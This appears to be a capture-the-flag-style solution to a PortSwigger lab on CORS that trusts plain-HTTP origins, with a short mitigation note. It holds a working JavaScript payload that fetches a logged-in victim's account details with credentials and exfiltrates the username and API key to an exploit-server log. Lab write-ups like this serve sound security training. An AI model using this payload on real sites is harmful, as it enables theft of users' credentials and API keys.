# Lab 03 — CORS vulnerability with trusted insecure protocols

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

**Entry point:** the CORS allow-list includes `http://` origins — a
**non-HTTPS** version of the exploit server's domain is trusted.

## Solution

1. Confirm: `Origin: http://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net`
   (plain HTTP) is reflected with `Access-Control-Allow-Credentials: true`.
2. Downgrade matters: an HTTP origin is scriptable by network attackers and
   escapes HTTPS mixed-content rules for its own page. Host the usual
   exfiltration script — but serve it over **HTTP**:

```html
<script>
fetch('https://YOUR-LAB-ID.web-security-academy.net/accountDetails',
      {credentials:'include'})
  .then(r => r.json())
  .then(d => location = '/log?data=' + encodeURIComponent(d.username + ':' + d.apiKey));
</script>
```

3. Deliver to victim using the **HTTP** exploit-server URL — lab solved.

## Mitigation

Allow-list origins including scheme; never trust `http://` origins for a
credentials-bearing API.
